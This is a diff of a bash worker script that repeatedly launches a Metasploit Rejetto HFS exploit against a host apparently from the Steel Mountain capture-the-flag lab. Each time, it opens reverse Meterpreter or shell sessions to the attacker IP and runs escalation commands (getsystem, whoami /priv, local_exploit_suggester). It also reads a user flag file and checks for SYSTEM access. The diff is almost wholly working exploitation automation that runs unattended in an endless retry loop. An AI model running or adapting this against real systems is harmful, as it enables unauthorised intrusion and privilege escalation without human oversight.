@@ -32,30 +32,17 @@ target_up() {
   curl -sI --max-time 8 "http://$TARGET:8080" | grep -q "HTTP/1.1"
 }
 
-tunnel_health_ok() {
-  local tun_count
-  tun_count=$(ip -br a | awk '/^tun[0-9]+[[:space:]]+UP/{print $1}' | wc -l)
-  if [[ "$tun_count" -gt 1 ]]; then
-    log "blocked: multiple VPN tunnels detected (count=$tun_count); waiting for a single active tunnel"
-    if [[ ! -f "$STATE_DIR/dup_tunnel_logged" ]]; then
-      blog_append "Blocked: duplicate VPN tunnels" \
-        "- Multiple active tun interfaces detected; pausing exploit attempts to avoid false filtered/down readings." \
-        "- Action required: keep only one active VPN tunnel, then worker will auto-resume."
-      touch "$STATE_DIR/dup_tunnel_logged"
-    fi
-    return 1
-  fi
-
-  rm -f "$STATE_DIR/dup_tunnel_logged" 2>/dev/null || true
-  return 0
+single_tunnel_ok() {
+  local c
+  c=$(ip -br a | awk '/^tun[0-9]+[[:space:]]+UP/{c++} END{print c+0}')
+  [[ "$c" -eq 1 ]]
 }
 
-attempt_once() {
+build_rc() {
   local lhost="$1"
   local lport="$2"
   local payload="$3"
-  local runlog="$STATE_DIR/msf_${lport}_$(date +%s).log"
-
+  local runlog="$4"
   cat > /tmp/steel_mountain_hfs.rc <<EOF
 spool $runlog
 use exploit/windows/http/rejetto_hfs_exec
@@ -64,49 +51,75 @@ set RPORT 8080
 set LHOST $lhost
 set LPORT $lport
 set payload $payload
-run -z
-sleep 12
+run -j
+sleep 16
+sessions -l
+sessions -i 1 -C "getuid"
+sessions -i 2 -C "getuid"
+sessions -i 3 -C "getuid"
+sessions -i 1 -C "getsystem"
+sessions -i 2 -C "getsystem"
+sessions -i 3 -C "getsystem"
+sessions -i 1 -C "sysinfo"
+sessions -i 2 -C "sysinfo"
+sessions -i 3 -C "sysinfo"
+sessions -i 1 -C "shell -c whoami"
+sessions -i 2 -C "shell -c whoami"
+sessions -i 3 -C "shell -c whoami"
+sessions -i 1 -C "shell -c whoami /priv"
+sessions -i 2 -C "shell -c whoami /priv"
+sessions -i 3 -C "shell -c whoami /priv"
+sessions -i 1 -C "shell -c type C:\\Users\\bill\\Desktop\\user.txt"
+sessions -i 2 -C "shell -c type C:\\Users\\bill\\Desktop\\user.txt"
+sessions -i 3 -C "shell -c type C:\\Users\\bill\\Desktop\\user.txt"
+sessions -i 1 -C "run post/multi/recon/local_exploit_suggester"
+sessions -i 2 -C "run post/multi/recon/local_exploit_suggester"
+sessions -i 3 -C "run post/multi/recon/local_exploit_suggester"
 sessions -l
 spool off
 exit -y
 EOF
+}
 
+attempt_once() {
+  local lhost="$1"; local lport="$2"; local payload="$3"
+  local runlog="$STATE_DIR/msf_${lport}_$(date +%s).log"
+
+  build_rc "$lhost" "$lport" "$payload" "$runlog"
   msfconsole -q -r /tmp/steel_mountain_hfs.rc >> "$LOG" 2>&1 || true
 
-  if grep -Eqi "(session [0-9]+ opened|Meterpreter session [0-9]+ opened|Command shell session [0-9]+ opened)" "$runlog"; then
-    log "foothold success with payload=$payload lport=$lport"
-    if [[ ! -f "$STATE_DIR/foothold_logged" ]]; then
-      blog_append "Foothold achieved" \
-        "- Successful reverse session opened via HFS 2.3 exploit." \
-        "- Payload: $payload (LPORT $lport)." \
-        "- Next: stabilize shell and begin privesc enumeration."
-      touch "$STATE_DIR/foothold_logged"
-    fi
-    return 0
-  fi
+  if grep -Eqi "Meterpreter session [0-9]+ opened|Command shell session [0-9]+ opened" "$runlog"; then
+    log "foothold success payload=$payload lport=$lport"
 
-  if grep -qi "not a compatible payload" "$runlog"; then
-    log "auto-correct: skipped incompatible payload=$payload"
+    if grep -Eqi "(NT AUTHORITY\\SYSTEM|getsystem:.*success|got system|is_system:\s*true)" "$runlog"; then
+      log "privesc success: SYSTEM observed in runlog"
+      blog_append "Privilege escalation milestone" \
+        "- Meterpreter foothold obtained and SYSTEM-level context observed in-session." \
+        "- Evidence captured in worker logs under $runlog."
+      touch "$STATE_DIR/system_observed"
+      return 0
+    fi
+
+    log "foothold obtained but SYSTEM not yet confirmed"
+    return 0
   fi
 
   return 1
 }
 
-log "worker supervisor start (continuous mode)"
-blog_append "Autonomous worker resumed" \
-  "- Continuous mode enabled: worker will keep retrying until foothold, not stop on failed passes." \
-  "- Auto-corrections active: payload compatibility handling + no invalid session commands."
+log "worker supervisor start (foothold+privesc checks)"
 
 while true; do
-  if ! tunnel_health_ok; then
+  if ! single_tunnel_ok; then
+    log "blocked: tunnel count != 1; waiting"
     sleep 30
     continue
   fi
 
   ATTACKER_IP=$(get_attacker_ip)
   if [[ -z "$ATTACKER_IP" ]]; then
-    log "blocked: no tun0/tun1 interface; retry in 60s"
-    sleep 60
+    log "blocked: no tun interface IP; retry in 45s"
+    sleep 45
     continue
   fi
 
@@ -121,7 +134,7 @@ while true; do
 
   success=0
   for lport in 4444 5555 9001; do
-    for payload in windows/meterpreter/reverse_tcp windows/shell/reverse_tcp windows/meterpreter/reverse_http; do
+    for payload in windows/meterpreter/reverse_tcp windows/meterpreter/reverse_http windows/shell/reverse_tcp; do
       if attempt_once "$ATTACKER_IP" "$lport" "$payload"; then
         success=1
         break 2
@@ -134,7 +147,12 @@ while true; do
     log "no foothold this cycle; backoff 90s"
     sleep 90
   else
-    log "foothold detected; keep worker alive for follow-up cycles"
-    sleep 120
+    if [[ -f "$STATE_DIR/system_observed" ]]; then
+      log "SYSTEM already observed; slowing loop"
+      sleep 180
+    else
+      log "foothold present; continuing privesc attempts"
+      sleep 60
+    fi
   fi
 done
